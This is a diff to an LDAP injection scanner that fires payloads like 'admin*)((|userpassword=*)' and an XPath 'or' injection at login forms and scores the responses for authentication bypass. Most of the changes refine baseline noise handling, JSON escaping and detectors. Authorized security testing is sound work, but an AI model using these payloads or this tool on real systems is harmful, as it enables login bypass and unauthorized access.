@@ -110,6 +110,49 @@ ENUM_PATTERNS = [
     re.compile(r"samaccountname=admin\*", re.IGNORECASE),
 ]
 
+# ----------------------------------------------------------------------------
+# Dynamic-content patterns. These match fields that change between identical
+# requests (CSRF tokens, ViewState, timestamps, UUIDs). We strip them before
+# any length comparison so detector firing isn't poisoned by per-response
+# noise. Add new patterns here when you see false positives from a specific
+# framework.
+# ----------------------------------------------------------------------------
+_NORMALIZE_PATTERNS = [
+    # ASP.NET hidden fields with value="..."
+    re.compile(r'name="__VIEWSTATE"[^>]*value="[^"]*"', re.IGNORECASE),
+    re.compile(r'name="__VIEWSTATEGENERATOR"[^>]*value="[^"]*"', re.IGNORECASE),
+    re.compile(r'name="__EVENTVALIDATION"[^>]*value="[^"]*"', re.IGNORECASE),
+    re.compile(r'name="__RequestVerificationToken"[^>]*value="[^"]*"', re.IGNORECASE),
+    # Generic CSRF / nonce / token fields
+    re.compile(r'name="[^"]*(?:csrf|nonce|token)[^"]*"[^>]*value="[^"]*"', re.IGNORECASE),
+    # Meta CSRF tags
+    re.compile(r'<meta[^>]+(?:csrf|nonce|token)[^>]*>', re.IGNORECASE),
+    # ISO 8601 timestamps
+    re.compile(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?Z?'),
+    # UUIDs
+    re.compile(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'),
+]
+
+
+def normalize_body(text: str) -> str:
+    """Strip dynamic per-response fields so length comparisons are stable."""
+    if not text:
+        return text
+    out = text
+    for pat in _NORMALIZE_PATTERNS:
+        out = pat.sub("", out)
+    return out
+
+
+def _json_string_inner(s: str) -> str:
+    """
+    Return `s` formatted to be safely embedded inside a JSON string literal.
+
+    `json.dumps('a"b\\c')` -> `'"a\\"b\\\\c"'`; we strip the wrapping quotes
+    because the original body already supplies them around the marker.
+    """
+    return json.dumps(s)[1:-1]
+
 BANNER = r"""
  _     ____    _    ____  ____                                  
 | |   |  _ \  / \  |  _ \/ ___|  ___ __ _ _ __  _ __   ___ _ __ 
@@ -140,7 +183,6 @@ BUILTIN_WORDLIST = r"""
 |
 admin*
 admin*)((|userpassword=*)
-admin*)((|userPassword=*)
 x' or name()='username' or 'x'='y
 !
 %21
@@ -307,7 +349,6 @@ Administrator*
 ADMIN*
 admin)(|(userPassword=*
 admin*)((|userpassword=*)
-admin*)((|userPassword=*)
 )(|(userPassword=*
 admin)(userPassword=*
 admin)(&(password=*
@@ -474,8 +515,12 @@ def parse_request(filepath: str) -> Dict[str, Any]:
     with open(filepath, "rb") as f:
         raw_bytes = f.read()
 
-    # Decode as latin-1 to preserve any binary in body; we'll re-encode on send
-    raw = raw_bytes.decode("utf-8", errors="replace")
+    # Decode as latin-1 to preserve any binary in body; we'll re-encode on send.
+    # latin-1 is a byte-for-byte round-trip (0x00-0xFF -> U+0000-U+00FF), so
+    # binary payloads survive the decode/encode cycle unchanged. utf-8 with
+    # errors="replace" would turn invalid sequences into U+FFFD and corrupt
+    # them.
+    raw = raw_bytes.decode("latin-1")
     # Normalize line endings for parsing the header section
     normalized = raw.replace("\r\n", "\n")
 
@@ -538,17 +583,37 @@ def detect_markers(parsed: Dict[str, Any]) -> List[str]:
     return [m for m in MARKERS if m in haystack]
 
 
-def map_markers_to_fields(body: str) -> Dict[str, str]:
+def map_markers_to_fields(body: str, content_type: str = "") -> Dict[str, str]:
     """
-    For application/x-www-form-urlencoded bodies, map each marker to the
-    form field name that contains it. For other body types, return the
-    marker name itself as the 'field'.
+    For form-urlencoded bodies, map each marker to the form field name that
+    contains it. For JSON bodies, walk the JSON and map to the (dotted) key
+    path. For everything else, fall back to the marker name itself.
     """
     mapping: Dict[str, str] = {}
+    ct = (content_type or "").lower()
 
-    # Heuristic: looks like form-urlencoded if it has key=value pairs
-    looks_form = "=" in body and "\n" not in body.strip()
-    if looks_form:
+    if "application/json" in ct:
+        try:
+            obj = json.loads(body)
+        except (ValueError, json.JSONDecodeError):
+            obj = None
+        if obj is not None:
+            def _walk(node, path):
+                if isinstance(node, dict):
+                    for k, v in node.items():
+                        _walk(v, f"{path}.{k}" if path else k)
+                elif isinstance(node, list):
+                    for i, v in enumerate(node):
+                        _walk(v, f"{path}[{i}]")
+                elif isinstance(node, str):
+                    for m in MARKERS:
+                        if m in node and m not in mapping:
+                            mapping[m] = path or m
+            _walk(obj, "")
+    elif "application/x-www-form-urlencoded" in ct or (
+        not ct and "=" in body and "\n" not in body.strip()
+    ):
+        # Form bodies: key1=val1&key2=val2
         for pair in body.split("&"):
             if "=" not in pair:
                 continue
@@ -557,7 +622,7 @@ def map_markers_to_fields(body: str) -> Dict[str, str]:
                 if m in value:
                     mapping[m] = key
 
-    # Fallback for any marker not yet mapped
+    # Fallback for anything not mapped above (path/header markers, XML bodies, etc.)
     for m in MARKERS:
         if m in body and m not in mapping:
             mapping[m] = m
@@ -647,6 +712,7 @@ def build_body(
     known_user: Optional[str],
     encode: bool,
     announce_encode: bool = True,
+    content_type: str = "",
 ) -> str:
     """
     Substitute markers in body.
@@ -655,8 +721,12 @@ def build_body(
     - KNOWNUSER active → payload appended AFTER known_user
     - All other markers → their safe baseline values
     - When active_marker is None (baseline), all markers → safe baselines.
+
+    For application/json bodies, substituted values are JSON-string-escaped
+    so payloads containing quotes/backslashes don't corrupt the body.
     """
     body = original_body
+    is_json = "application/json" in (content_type or "").lower()
 
     for marker in MARKERS:
         if marker not in body:
@@ -666,19 +736,20 @@ def build_body(
             if marker == "KNOWNUSER":
                 if not known_user:
                     raise ValueError("KNOWNUSER marker active but --known-user not provided.")
-                value = known_user + maybe_encode(payload, encode, announce=announce_encode)
+                raw_value = known_user + maybe_encode(payload, encode, announce=announce_encode)
             else:
-                value = maybe_encode(payload, encode, announce=announce_encode)
+                raw_value = maybe_encode(payload, encode, announce=announce_encode)
         else:
             # Use safe baseline value
             if marker == "KNOWNUSER":
                 if known_user:
-                    value = known_user + "_baseline_xyz"
+                    raw_value = known_user + "_baseline_xyz"
                 else:
-                    value = "knownuser_baseline_xyz"
+                    raw_value = "knownuser_baseline_xyz"
             else:
-                value = SAFE_BASELINES.get(marker, marker.lower() + "_safe")
+                raw_value = SAFE_BASELINES.get(marker, marker.lower() + "_safe")
 
+        value = _json_string_inner(raw_value) if is_json else raw_value
         body = body.replace(marker, value)
 
     return body
@@ -722,7 +793,14 @@ def send_request(
 
     Always uses allow_redirects=False. Returns (response, elapsed_seconds, error_msg).
     """
-    body_bytes = body.encode("utf-8", errors="replace")
+    # latin-1 mirrors the latin-1 decode in parse_request, giving us a clean
+    # byte-for-byte round-trip. If the body contains non-latin-1 chars (e.g.
+    # Turkish letters injected via marker substitution), fall back to utf-8
+    # so we still produce a valid request.
+    try:
+        body_bytes = body.encode("latin-1")
+    except UnicodeEncodeError:
+        body_bytes = body.encode("utf-8", errors="replace")
     headers = update_content_length(parsed["headers"], body_bytes)
     url = build_url(parsed, args.ssl)
 
@@ -761,35 +839,79 @@ def send_request(
 
 def run_baseline(parsed: Dict[str, Any], args: argparse.Namespace) -> Dict[str, Any]:
     """
-    Send one request with all markers replaced by safe dummy values.
+    Send N requests with all markers replaced by safe dummy values to
+    establish an invalid-login baseline AND estimate response-length noise
+    (CSRF tokens, ViewState, etc. cause natural variation between identical
+    requests). N is controlled by --baseline-samples.
 
-    Returns dict with: status, length, time, location, body_text.
+    Returns dict with: status, length (raw, first sample), normalized_length
+    (mean across samples after stripping dynamic fields), length_stdev,
+    time, location, body_text (first sample), normalized_body.
     """
-    body = build_body(
-        parsed["body"],
-        active_marker=None,
-        payload=None,
-        known_user=args.known_user,
-        encode=args.encode,
-        announce_encode=False,
-    )
-    resp, elapsed, error = send_request(parsed, body, args)
-    if resp is None:
+    content_type = parsed["headers"].get("Content-Type", "")
+    samples = max(1, int(getattr(args, "baseline_samples", 1)))
+
+    bodies: List[str] = []
+    norm_lengths: List[int] = []
+    statuses: List[int] = []
+    locations: List[Optional[str]] = []
+    times: List[float] = []
+
+    last_error: Optional[str] = None
+    for i in range(samples):
+        body = build_body(
+            parsed["body"],
+            active_marker=None,
+            payload=None,
+            known_user=args.known_user,
+            encode=args.encode,
+            announce_encode=False,
+            content_type=content_type,
+        )
+        resp, elapsed, error = send_request(parsed, body, args)
+        if resp is None:
+            last_error = error
+            if not bodies:
+                # First sample failure is fatal — we have nothing to baseline on
+                continue
+            warn(f"Baseline sample {i+1}/{samples} failed: {error}")
+            continue
+        bodies.append(resp.text)
+        norm_lengths.append(len(normalize_body(resp.text)))
+        statuses.append(resp.status_code)
+        locations.append(resp.headers.get("Location"))
+        times.append(elapsed)
+        if i < samples - 1:
+            time.sleep(args.delay)
+
+    if not bodies:
         hint = ""
-        if error and "UNSAFE_LEGACY_RENEGOTIATION_DISABLED" in error:
+        if last_error and "UNSAFE_LEGACY_RENEGOTIATION_DISABLED" in last_error:
             hint = (
                 "\n    Hint: the target requires legacy TLS renegotiation "
                 "(common on older IIS).\n          Re-run with --legacy-ssl"
             )
-        elif error and error.startswith("ssl_error") and not args.no_verify:
+        elif last_error and last_error.startswith("ssl_error") and not args.no_verify:
             hint = "\n    Hint: try --no-verify if the cert chain is the issue."
-        raise RuntimeError(f"Baseline request failed: {error}{hint}")
+        raise RuntimeError(f"Baseline request failed: {last_error}{hint}")
+
+    mean_norm = sum(norm_lengths) / len(norm_lengths)
+    if len(norm_lengths) >= 2:
+        variance = sum((x - mean_norm) ** 2 for x in norm_lengths) / (len(norm_lengths) - 1)
+        stdev = variance ** 0.5
+    else:
+        stdev = 0.0
+
     return {
-        "status": resp.status_code,
-        "length": len(resp.content),
-        "time": elapsed,
-        "location": resp.headers.get("Location"),
-        "body_text": resp.text,
+        "status": statuses[0],
+        "length": len(bodies[0].encode("utf-8", errors="replace")),
+        "normalized_length": int(round(mean_norm)),
+        "length_stdev": stdev,
+        "samples": len(bodies),
+        "time": times[0],
+        "location": locations[0],
+        "body_text": bodies[0],
+        "normalized_body": normalize_body(bodies[0]),
     }
 
 
@@ -798,21 +920,29 @@ def run_valid_baseline(parsed: Dict[str, Any], args: argparse.Namespace) -> Opti
     Run a known-good login baseline if --baseline-user and --baseline-pass are set.
 
     Substitutes USERNAME / KNOWNUSER with the valid user, PASSWORD with the valid pass.
+    Returned shape matches run_baseline so detect() can compare against it.
     """
     if not (args.baseline_user and args.baseline_pass):
         return None
 
+    content_type = parsed["headers"].get("Content-Type", "")
+    is_json = "application/json" in content_type.lower()
+
     body = parsed["body"]
-    # USERNAME / KNOWNUSER → valid user
+    # USERNAME / KNOWNUSER → valid user; PASSWORD → valid pass.
+    # Escape for JSON bodies so credentials with quotes/backslashes don't break the body.
+    valid_user = _json_string_inner(args.baseline_user) if is_json else args.baseline_user
+    valid_pass = _json_string_inner(args.baseline_pass) if is_json else args.baseline_pass
     for m in ("USERNAME", "KNOWNUSER"):
         if m in body:
-            body = body.replace(m, args.baseline_user)
+            body = body.replace(m, valid_user)
     if "PASSWORD" in body:
-        body = body.replace("PASSWORD", args.baseline_pass)
+        body = body.replace("PASSWORD", valid_pass)
     # Replace anything remaining with safe baselines
     body = build_body(
         body, active_marker=None, payload=None,
         known_user=args.known_user, encode=args.encode, announce_encode=False,
+        content_type=content_type,
     )
 
     resp, elapsed, error = send_request(parsed, body, args)
@@ -822,9 +952,13 @@ def run_valid_baseline(parsed: Dict[str, Any], args: argparse.Namespace) -> Opti
     return {
         "status": resp.status_code,
         "length": len(resp.content),
+        "normalized_length": len(normalize_body(resp.text)),
+        "length_stdev": 0.0,  # single sample
+        "samples": 1,
         "time": elapsed,
         "location": resp.headers.get("Location"),
         "body_text": resp.text,
+        "normalized_body": normalize_body(resp.text),
     }
 
 
@@ -832,34 +966,57 @@ def detect(
     response: requests.Response,
     elapsed: float,
     baseline: Dict[str, Any],
+    baseline_valid: Optional[Dict[str, Any]],
     success_kw: List[str],
     error_kw: List[str],
     threshold: int,
 ) -> List[str]:
-    """Compare response against baseline. Return list of fired detector names."""
+    """
+    Compare response against baselines. Return list of fired detector names.
+
+    Detectors:
+      STATUS_CHANGE     - status_code differs from invalid baseline
+      LENGTH_DIFF       - normalized body length differs beyond noise floor
+      SUCCESS_KEYWORD   - a success kw is present here but NOT in invalid baseline
+      ERROR_GONE        - an error kw present in invalid baseline is absent here
+      REDIRECT_CHANGE   - Location header differs from invalid baseline
+      VALID_MATCH       - response looks closer to the *valid* baseline than the
+                          invalid one (status, length, or redirect target)
+    """
     fired = []
     body_text = response.text or ""
+    normalized = normalize_body(body_text)
     body_lower = body_text.lower()
     baseline_body_lower = (baseline.get("body_text") or "").lower()
-    length = len(response.content)
+    norm_length = len(normalized)
+
+    # Threshold floor: user value OR 3-sigma of baseline noise, whichever is larger.
+    # Avoids LENGTH_DIFF false-positives when CSRF/ViewState already account for
+    # most of the variance.
+    stdev = baseline.get("length_stdev", 0.0) or 0.0
+    effective_threshold = max(threshold, int(round(3 * stdev)))
+    base_norm_len = baseline.get("normalized_length", baseline.get("length", 0))
 
     # STATUS_CHANGE
     if response.status_code != baseline["status"]:
         fired.append("STATUS_CHANGE")
 
-    # LENGTH_DIFF
-    if abs(length - baseline["length"]) > threshold:
+    # LENGTH_DIFF (normalized)
+    if abs(norm_length - base_norm_len) > effective_threshold:
         fired.append("LENGTH_DIFF")
 
-    # SUCCESS_KEYWORD (in current, regardless of baseline)
+    # SUCCESS_KEYWORD: present now AND absent from invalid baseline.
+    # (Previously fired any time the kw appeared, even when login pages
+    # already contained the word — major false-positive source.)
     for kw in success_kw:
-        if kw and kw.lower() in body_lower:
+        kwl = (kw or "").lower()
+        if kwl and kwl in body_lower and kwl not in baseline_body_lower:
             fired.append("SUCCESS_KEYWORD")
             break
 
-    # ERROR_GONE: was in baseline body, absent in current
+    # ERROR_GONE: was in invalid baseline, absent in current
     for kw in error_kw:
-        kwl = kw.lower()
+        kwl = (kw or "").lower()
         if kwl and kwl in baseline_body_lower and kwl not in body_lower:
             fired.append("ERROR_GONE")
             break
@@ -867,12 +1024,44 @@ def detect(
     # REDIRECT_CHANGE
     cur_loc = response.headers.get("Location")
     base_loc = baseline.get("location")
-    if cur_loc != base_loc:
-        # Only fire if at least one side actually had a Location
-        if cur_loc is not None or base_loc is not None:
-            fired.append("REDIRECT_CHANGE")
+    if cur_loc != base_loc and (cur_loc is not None or base_loc is not None):
+        fired.append("REDIRECT_CHANGE")
+
+    # VALID_MATCH: only meaningful if we have a known-good baseline to compare to.
+    if baseline_valid:
+        valid_status = baseline_valid["status"]
+        valid_norm_len = baseline_valid.get("normalized_length", baseline_valid.get("length", 0))
+        valid_loc = baseline_valid.get("location")
+
+        # Status matches the valid login and differs from invalid
+        status_matches_valid = (
+            response.status_code == valid_status
+            and valid_status != baseline["status"]
+        )
+        # Body length closer to valid-baseline than invalid-baseline
+        d_valid = abs(norm_length - valid_norm_len)
+        d_invalid = abs(norm_length - base_norm_len)
+        length_closer_to_valid = (
+            d_invalid > effective_threshold
+            and d_valid <= effective_threshold
+            and d_valid < d_invalid
+        )
+        # Redirect target matches valid (and differs from invalid)
+        redirect_matches_valid = (
+            valid_loc is not None
+            and cur_loc == valid_loc
+            and valid_loc != base_loc
+        )
+
+        if status_matches_valid or length_closer_to_valid or redirect_matches_valid:
+            fired.append("VALID_MATCH")
 
     return fired
+
+
+# Detectors with high semantic weight. Confidence promotion to HIGH requires
+# at least one of these to fire (sheer count of weak detectors is not enough).
+STRONG_DETECTORS = frozenset({"SUCCESS_KEYWORD", "ERROR_GONE", "VALID_MATCH"})
 
 
 # ============================================================================
@@ -944,19 +1133,32 @@ class Scanner:
         self.baseline = run_baseline(self.parsed, self.args)
         info(
             f"Baseline (invalid): status={self.baseline['status']}, "
-            f"len={self.baseline['length']}, time={self.baseline['time']:.2f}s"
+            f"raw_len={self.baseline['length']}, "
+            f"norm_len={self.baseline['normalized_length']} "
+            f"(stdev={self.baseline['length_stdev']:.1f} over "
+            f"{self.baseline['samples']} sample(s)), "
+            f"time={self.baseline['time']:.2f}s"
             + (f", location={self.baseline['location']}" if self.baseline.get("location") else "")
         )
+        # Warn if the noise floor swallows the user threshold
+        noise_floor = int(round(3 * self.baseline['length_stdev']))
+        if noise_floor > self.args.threshold:
+            warn(f"Baseline noise (3σ={noise_floor}) exceeds --threshold "
+                 f"({self.args.threshold}); using {noise_floor} as effective floor.")
 
         self.baseline_valid = run_valid_baseline(self.parsed, self.args)
         if self.baseline_valid:
             info(
                 f"Baseline (valid):   status={self.baseline_valid['status']}, "
-                f"len={self.baseline_valid['length']}, "
+                f"raw_len={self.baseline_valid['length']}, "
+                f"norm_len={self.baseline_valid['normalized_length']}, "
                 f"time={self.baseline_valid['time']:.2f}s"
                 + (f", location={self.baseline_valid['location']}"
                    if self.baseline_valid.get("location") else "")
             )
+            info("VALID_MATCH detector is ACTIVE.")
+        else:
+            info("VALID_MATCH detector inactive (no --baseline-user/--baseline-pass).")
 
         # ===== Decide which markers to scan =====
         markers_to_scan = []
@@ -1005,6 +1207,7 @@ class Scanner:
 
     # --------------------------------------------------------------------
     def _scan_one(self, idx: int, total: int, marker: str, field: str, payload: str) -> None:
+        content_type = self.parsed["headers"].get("Content-Type", "")
         body = build_body(
             self.parsed["body"],
             active_marker=marker,
@@ -1012,6 +1215,7 @@ class Scanner:
             known_user=self.args.known_user,
             encode=self.args.encode,
             announce_encode=True,
+            content_type=content_type,
         )
         # Also substitute markers in path / headers if present (uses safe values
         # for non-active markers and the encoded payload for the active one).
@@ -1032,6 +1236,8 @@ class Scanner:
             "response_time": elapsed,
             "baseline_status": self.baseline["status"],
             "baseline_length": self.baseline["length"],
+            "baseline_normalized_length": self.baseline.get("normalized_length"),
+            "baseline_length_stdev": round(self.baseline.get("length_stdev", 0.0), 2),
             "baseline_time": self.baseline["time"],
             "detectors_fired": [],
             "confidence": "NONE",
@@ -1055,19 +1261,26 @@ class Scanner:
             resp,
             elapsed,
             self.baseline,
+            self.baseline_valid,
             self.success_kw,
             self.error_kw,
             self.args.threshold,
         )
         record["detectors_fired"] = fired
 
-        if len(fired) >= 2:
+        # Confidence rules:
+        #   HIGH      - at least one STRONG detector (SUCCESS_KEYWORD / ERROR_GONE /
+        #               VALID_MATCH) AND total fired >= 2
+        #   POTENTIAL - any detector fired but no strong corroboration
+        #   NONE      - no detector fired
+        has_strong = any(d in STRONG_DETECTORS for d in fired)
+        if has_strong and len(fired) >= 2:
             confidence = "HIGH"
             record["confidence"] = "HIGH"
             record["vulnerable"] = True
             self.findings += 1
             self.high_confidence += 1
-        elif len(fired) == 1:
+        elif fired:
             confidence = "POTENTIAL"
             record["confidence"] = "POTENTIAL"
             record["vulnerable"] = True
@@ -1144,6 +1357,9 @@ class Scanner:
         if self.args.only_findings:
             out_results = [r for r in self.results if r.get("vulnerable")]
 
+        # Strip large fields from baseline snapshots; they're useful at runtime
+        # but make the JSON report bloat with HTML duplicates.
+        _OMIT = {"body_text", "normalized_body"}
         meta = {
             "tool": "ldapscanner.py",
             "version": VERSION,
@@ -1155,9 +1371,9 @@ class Scanner:
             "encode": self.args.encode,
             "markers_found": self.markers_found,
             "marker_to_field": self.marker_to_field,
-            "baseline_invalid": {k: v for k, v in (self.baseline or {}).items() if k != "body_text"},
+            "baseline_invalid": {k: v for k, v in (self.baseline or {}).items() if k not in _OMIT},
             "baseline_valid": (
-                {k: v for k, v in self.baseline_valid.items() if k != "body_text"}
+                {k: v for k, v in self.baseline_valid.items() if k not in _OMIT}
                 if self.baseline_valid else None
             ),
             "total_requests": self.total_sent,
@@ -1250,6 +1466,8 @@ def build_argparser() -> argparse.ArgumentParser:
                    help="Known valid username for success baseline")
     p.add_argument("--baseline-pass", default=None,
                    help="Known valid password for success baseline")
+    p.add_argument("--baseline-samples", type=int, default=3,
+                   help="Number of invalid-baseline samples to estimate noise floor (default: 3)")
     p.add_argument("--success-kw", default=None,
                    help="Comma-separated success keywords (overrides defaults)")
     p.add_argument("--error-kw", default=None,
@@ -1348,7 +1566,10 @@ def main() -> int:
         return 2
 
     info(f"Markers detected: {', '.join(markers_found)}")
-    marker_to_field = map_markers_to_fields(parsed["body"])
+    marker_to_field = map_markers_to_fields(
+        parsed["body"],
+        parsed["headers"].get("Content-Type", ""),
+    )
     if marker_to_field:
         for m, f in marker_to_field.items():
             info(f"  {m} -> field '{f}'")
